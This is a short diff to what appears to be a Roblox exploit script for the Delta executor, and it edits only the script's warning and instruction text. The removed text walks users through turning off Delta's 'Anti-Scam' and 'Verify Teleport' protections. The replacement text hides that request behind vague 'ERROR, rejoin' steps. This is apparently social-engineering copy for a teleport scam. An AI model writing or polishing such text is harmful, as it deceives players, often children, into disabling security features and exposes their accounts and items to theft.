@@ -66,7 +66,7 @@ if executor == "Delta" then
     warningBar.Size = UDim2.new(1, 0, 0.15, 0)
     warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
-    warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
+    warningBar.Text = [[Rejoin if it says <u>ERROR</u> to avoid getting banned or disconnected.]]
     warningBar.RichText = true
     warningBar.TextSize = 14
     warningBar.Font = Enum.Font.GothamBold
@@ -114,11 +114,11 @@ if executor == "Delta" then
     desc.TextWrapped = true
     desc.TextXAlignment = Enum.TextXAlignment.Center
     desc.TextYAlignment = Enum.TextYAlignment.Center
-    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
-1) Tap the Delta icon at the top.
-2) Open Settings (gear icon).
-3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
-4) Rejoin and run the script again. ]]
+    desc.Text = [[ The script requires teleportation if it says "<font color="#FFD700">ERROR</font>".
+1) Check if it say's Error in the top.
+2) Click "Rejoin Game" if yes (Click Open Script) if not.
+3) Run the script again.
+4) Click Open Script. ]]
     desc.RichText = true
 
     -- Button Container
